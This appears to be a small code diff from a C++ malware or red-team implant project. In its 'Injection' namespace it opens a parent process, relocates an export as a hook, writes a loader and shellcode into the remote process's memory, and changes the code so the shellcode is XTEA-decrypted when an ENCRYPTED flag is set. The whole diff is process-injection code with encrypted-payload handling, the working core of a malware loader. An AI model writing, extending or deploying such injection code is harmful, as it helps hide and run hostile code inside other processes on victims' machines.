@@ -18,8 +18,8 @@ namespace Injection {
         x_assert(process    = Process::OpenParentProcess(writer.parent));
         x_assert(hook       = Memory::Scanners::RelocateExport(process, C_PTR(ex_addr), n_shellcode));
 
-        hook_p = hook;
-        loader_rva = hook - (ex_addr + 5);
+        hook_p      = hook;
+        loader_rva  = hook - (ex_addr + 5);
 
         x_memcpy(&ex_addr_p, &ex_addr, sizeof(void*));
         x_memcpy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
@@ -33,7 +33,9 @@ namespace Injection {
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write));
         x_assert(write != writer.loader->length);
 
-        //Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->Config.Key, FALSE);
+        if (ENCRYPTED) {
+            Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->config.key, FALSE);
+        }
 
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, RVA(PBYTE, hook, writer.loader->length), shellcode, n_shellcode, &write));
         x_assert(write != n_shellcode);
